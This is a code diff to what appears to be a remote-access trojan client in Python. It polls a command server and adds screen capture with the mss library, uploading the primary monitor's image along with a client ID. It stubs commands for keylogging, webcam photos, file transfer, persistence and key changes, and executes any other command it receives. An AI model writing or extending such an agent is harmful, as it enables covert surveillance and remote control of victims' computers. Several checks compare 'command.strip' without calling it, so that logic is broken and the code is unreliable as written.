@@ -4,6 +4,7 @@ import time
 import platform
 import os
 import json
+import mss
 
 SERVER_URL = "http://127.0.0.1:5000"  # Change to your actual server URL later
 
@@ -161,10 +162,31 @@ while True:
         # Check if the response status is OK
         if response.status_code == 200:
             command = response.json().get("command")
-            
-            # If there's a command, execute it
-            if command:
-                print(command)  # for logging, remove later
+            print(command)  # for logging, remove later
+            if command == "screenshot":
+                with mss.mss() as sct:
+                    screenshot = sct.grab(sct.monitors[1])  # Capture the primary monitor
+                    response = requests.post(f"{SERVER_URL}/api/screenshot", files={"file": ("screenshot.png", mss.tools.to_png(screenshot.rgb, screenshot.size))},data={"client_id": client_id}  # Include client_id in the request
+                )
+                print(response.text)  # Print the API response
+                command = ""
+            if command.strip == "start_keylog":
+                pass
+            if command.strip == "stop_keylog":
+                pass
+            if command.strip == "photo":
+                pass
+            if command.strip == "screenshot":
+                pass
+            if command.strip == "upload":
+                pass
+            if command.strip == "download":
+                pass
+            if command.strip == "persist":
+                pass
+            if command.strip == "change_key":
+                pass
+            else:    
                 result = execute_command(command)
                 
                 # Send the result back to the server
